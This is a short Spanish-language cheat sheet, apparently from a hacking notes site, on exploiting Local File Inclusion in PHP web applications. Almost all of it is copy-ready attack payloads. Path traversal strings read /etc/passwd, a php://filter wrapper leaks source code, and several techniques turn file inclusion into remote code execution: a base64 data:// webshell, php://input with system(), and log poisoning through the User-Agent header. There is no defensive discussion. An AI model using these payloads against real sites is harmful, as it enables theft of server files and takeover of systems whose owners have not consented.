---
title: "Local File Inclusion (LFI)"
layout: "single"
category: "Web Hacking"
slug: "web-hacking/lfi"
date: "2025-11-26"
---

### Cheatsheet Rápido
* **Básico:** `../../../../etc/passwd`
* **Null Byte:** `../../etc/passwd%00` (PHP < 5.3)
* **Path Truncation:** `....//....//etc/passwd`

### PHP Wrappers (Lectura)
Leer archivos codificados en Base64 (evita ejecución):
```text
php://filter/convert.base64-encode/resource=index.php
```

### LFI to RCE (Ejecución)

**1. Data Wrapper:**
```text
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
```

**2. PHP Input (POST):**
URL: `?page=php://input` | Body: `<?php system('id'); ?>`

**3. Log Poisoning:**
1.  User-Agent: `<?php system($_GET['c']); ?>`
2.  LFI: `/var/log/apache2/access.log&c=ls`

**4. PHP Filter Chain Generator:**
Usa [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) para RCE sin subir archivos.
